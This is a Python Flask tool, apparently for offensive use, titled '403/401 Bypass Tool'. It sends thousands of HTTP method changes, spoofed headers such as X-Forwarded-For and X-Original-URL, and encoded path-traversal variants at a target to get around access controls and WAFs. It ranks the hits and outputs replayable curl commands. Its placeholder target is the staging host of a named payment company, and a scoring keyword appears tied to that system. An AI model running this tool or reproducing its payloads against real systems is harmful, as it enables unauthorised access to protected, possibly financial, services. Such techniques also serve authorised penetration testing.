#!/usr/bin/env python3
"""
403/401 Bypass Tool v6.1 - Smart Path-Aware Production Edition
"""

from flask import Flask, render_template_string, request, jsonify
import threading, requests, time, hashlib, json, random, difflib, urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
import webbrowser
from urllib.parse import urlparse

requests.packages.urllib3.disable_warnings()
app = Flask(__name__)

# ========================= CONFIG =========================
TIMEOUT = 12
RETRIES = 2
MAX_WORKERS = 15
POLL_INTERVAL = 1200  # ms - reduced polling
USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/135.0.0.0 Safari/537.36"

# ======================= GLOBALS =======================
scan_running = False
stop_flag = False
target_url = ""
proxy_dict = None
baseline = {"status": None, "content": b"", "length": 0}
scan_results = []
live_log = []
log_lock = threading.Lock()
waf_name = "Unknown"
target_path = ""

def add_log(msg):
    with log_lock:
        live_log.append(f"[{time.strftime('%H:%M:%S')}] {msg}")
        if len(live_log) > 500:
            live_log.pop(0)

def get_text(content):
    try:
        return content.decode('utf-8', errors='ignore').lower()
    except:
        return str(content).lower()

def detect_waf(url):
    global waf_name
    try:
        r = requests.get(url, headers={"User-Agent": USER_AGENT}, timeout=8, verify=False, proxies=proxy_dict)
        if "cloudflare" in r.text.lower() or "cf-ray" in str(r.headers):
            waf_name = "Cloudflare"
        elif any(x in str(r.headers).lower() for x in ["awselb", "x-amzn"]):
            waf_name = "AWS WAF"
        add_log(f"🛡️ WAF: {waf_name}")
    except:
        pass

def is_real_bypass(baseline_content, status, content):
    if status not in (200, 201, 301, 302): return False, 0
    if len(content) < 300: return False, 0

    text = get_text(content)
    if any(p in text for p in ["forbidden", "access denied", "blocked", "403", "challenge", "ray id"]):
        return False, 0

    base_text = get_text(baseline_content)
    sim = difflib.SequenceMatcher(None, base_text[:6000], text[:6000]).ratio()
    if sim > 0.75: return False, 0

    conf = 50
    if any(w in text for w in ["dashboard", "panel", "welcome", "profile", "bancstac"]):
        conf += 40
    if len(content) > baseline["length"] * 1.5:
        conf += 25
    return True, min(98, conf)

def safe_request(method, url, headers=None):
    if headers is None: headers = {}
    headers.setdefault("User-Agent", USER_AGENT)
    for _ in range(RETRIES):
        try:
            r = requests.request(method, url, headers=headers, proxies=proxy_dict,
                                 timeout=TIMEOUT, verify=False, allow_redirects=True)
            return r.status_code, r.content, r.url, dict(r.headers)
        except:
            time.sleep(0.5)
    return None, b'', url, {}

def generate_smart_payloads(base_url, base_path):
    base = base_url.rstrip('/')
    payloads = []

    # Methods
    for m in ["GET", "POST", "PUT", "DELETE", "PATCH", "HEAD", "OPTIONS"]:
        payloads.append((m, base, {}, f"Method:{m}"))

    # Headers
    hdr = {
        "X-Forwarded-For": ["127.0.0.1", "::1", "localhost"],
        "X-Real-IP": ["127.0.0.1"],
        "X-Client-IP": ["127.0.0.1"],
        "X-Original-URL": [base_path],
        "X-Rewrite-URL": [base_path],
        "X-Forwarded-Host": ["localhost"],
    }
    for h, vals in hdr.items():
        for v in vals:
            payloads.append(("GET", base, {h: v}, f"Header:{h}={v}"))

    # Advanced Path Mutations (5000+)
    mods = ["", "/.", "/..", "/../", "/..;/", "/.;/", "/%2e%2e%2f", "?admin=true", "?debug=1", "/."]
    encs = ["", "%2e", "%252e", "%c0%ae", "%e0%80%af", "%uff0f", "%5c", "%09", "%0d%0a"]
    double = ["%25252e", "%2525c0%2525ae", "%25252f"]

    for mod in mods * 3:  # amplify
        for e in encs + double:
            for case in [mod, mod.upper(), mod.lower()]:
                u = base + case
                if e:
                    u = u.replace("/", f"/{e}/", 1) if "/" in u else u + e
                payloads.append(("GET", u, {}, f"Path:{case}+{e}"))

    random.shuffle(payloads)
    return payloads[:5800]

def test_payload(method, url, headers, desc):
    if stop_flag: return None
    status, content, final_url, _ = safe_request(method, url, headers)
    if status is None: return None

    success, conf = is_real_bypass(baseline["content"], status, content)
    if success:
        curl = f"curl -X {method} '{final_url}' -H 'User-Agent: {USER_AGENT}'"
        for k, v in headers.items():
            curl += f" -H '{k}: {v}'"
        return {
            "method": method,
            "url": final_url,
            "status": status,
            "description": desc,
            "confidence": conf,
            "curl": curl
        }
    return None

def scanner_worker():
    global scan_running, baseline
    add_log(f"Target: {target_url}")
    detect_waf(target_url)

    base_path = urlparse(target_url).path or "/"
    add_log(f"Using endpoint path: {base_path}")

    status, content, _, _ = safe_request("GET", target_url)
    baseline = {"status": status, "content": content, "length": len(content)}
    add_log(f"Baseline: {status} | Len: {baseline['length']}")

    test_cases = generate_smart_payloads(target_url, base_path)
    add_log(f"Generated {len(test_cases)} smart payloads. Starting scan...")

    found = []
    with ThreadPoolExecutor(max_workers=MAX_WORKERS) as ex:
        futures = {ex.submit(test_payload, *case): case for case in test_cases}
        for future in as_completed(futures):
            if stop_flag: break
            res = future.result()
            if res:
                found.append(res)
                scan_results.append(res)
                add_log(f"✅ BYPASS [{res['confidence']}%] {res['description']}")

    add_log(f"✅ Scan completed naturally. Found {len(found)} promising bypasses.")
    scan_running = False

# ======================= UI =======================
HTML = """<!DOCTYPE html>
<html>
<head>
    <title>403/401 Bypass Tool v6.1</title>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/css/bootstrap.min.css" rel="stylesheet">
    <style>body{background:#0a0a14;color:#ddd;font-family:Consolas,monospace;}
    .card{background:#1a1a2e;border:1px solid #ff4d4d;}
    .bypass{border-left:5px solid #4ade80;background:#0f3460;padding:12px;margin:8px 0;}</style>
</head>
<body class="p-4">
<div class="container">
    <h1 class="text-danger">403/401 Bypass Tool v6.1 <small>Smart & Stable</small></h1>
    <ul class="nav nav-tabs mb-4">
        <li class="nav-item"><a class="nav-link active" data-bs-toggle="tab" href="#scanner">Scanner</a></li>
        <li class="nav-item"><a class="nav-link" data-bs-toggle="tab" href="#results">Results</a></li>
    </ul>

    <div class="tab-content">
        <div class="tab-pane fade show active" id="scanner">
            <div class="card p-4">
                <input id="target" class="form-control mb-3" placeholder="https://paycorp-dfcc.stg.aws.paycorp.lk/user/product" style="width:80%">
                <input id="proxy" class="form-control mb-3" placeholder="http://127.0.0.1:8080">
                <button onclick="startScan()" class="btn btn-danger">Start Smart Scan (5800+ Payloads)</button>
                <button onclick="stopScan()" id="stopBtn" class="btn btn-secondary" disabled>Stop</button>
            </div>
        </div>
        <div class="tab-pane fade" id="results">
            <div class="card p-4">
                <h5>Bypasses <span id="count">(0)</span></h5>
                <button onclick="exportResults()" class="btn btn-outline-light">Export JSON</button>
                <div id="resultsList"></div>
            </div>
        </div>
    </div>

    <div class="card mt-4 p-3">
        <h6>Live Log</h6>
        <div id="log" style="height:320px;overflow-y:auto;background:#111;padding:10px;"></div>
    </div>
</div>

<script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.3/dist/js/bootstrap.bundle.min.js"></script>
<script>
let poll = null;
function startScan(){
    const t = document.getElementById('target').value.trim();
    if(!t) return alert("Enter URL");
    fetch('/start', {method:'POST', headers:{'Content-Type':'application/json'},
        body:JSON.stringify({target:t, proxy:document.getElementById('proxy').value.trim()})})
    .then(r=>r.json()).then(()=> { poll = setInterval(fetchStatus, 1500); });
}
function stopScan(){ fetch('/stop'); if(poll) clearInterval(poll); }
function fetchStatus(){
    fetch('/status').then(r=>r.json()).then(d=>{
        document.getElementById('count').textContent = `(${d.results.length})`;
        let html = d.results.slice().reverse().map(r => `
            <div class="bypass">
                <strong>[${r.status}] ${r.method}</strong> — ${r.confidence}% <br>
                ${r.description}<br>
                <small>${r.url}</small><br>
                <code>${r.curl}</code>
            </div>`).join('');
        document.getElementById('resultsList').innerHTML = html;

        let logHtml = d.log.slice(-60).map(l => `<div>${l}</div>`).join('');
        document.getElementById('log').innerHTML = logHtml;

        if(!d.running && poll) clearInterval(poll);
    });
}
function exportResults(){
    fetch('/export').then(r=>r.json()).then(data=>{
        const blob = new Blob([JSON.stringify(data,null,2)],{type:'application/json'});
        const a = document.createElement('a');
        a.href = URL.createObjectURL(blob);
        a.download = 'bypasses.json';
        a.click();
    });
}
</script>
</body>
</html>"""

@app.route('/')
def index(): return render_template_string(HTML)

@app.route('/start', methods=['POST'])
def start():
    global scan_running, target_url, proxy_dict, stop_flag, scan_results
    if scan_running: return jsonify({"status": "busy"})
    data = request.json
    target_url = data['target']
    p = data.get('proxy')
    proxy_dict = {'http': p, 'https': p} if p else None

    stop_flag = False
    scan_running = True
    scan_results.clear()
    with log_lock: live_log.clear()

    threading.Thread(target=scanner_worker, daemon=True).start()
    return jsonify({"status": "ok"})

@app.route('/stop')
def stop():
    global stop_flag, scan_running
    stop_flag = scan_running = False
    return jsonify({"status": "ok"})

@app.route('/status')
def status():
    with log_lock:
        return jsonify({"running": scan_running, "results": scan_results, "log": live_log[-70:]})

@app.route('/export')
def export():
    return jsonify(scan_results)

if __name__ == '__main__':
    print("\n=== 403/401 Bypass Tool v6.1 - Smart Path-Aware ===\n")
    webbrowser.open('http://127.0.0.1:5000')
    app.run(host='127.0.0.1', port=5000, threaded=True)
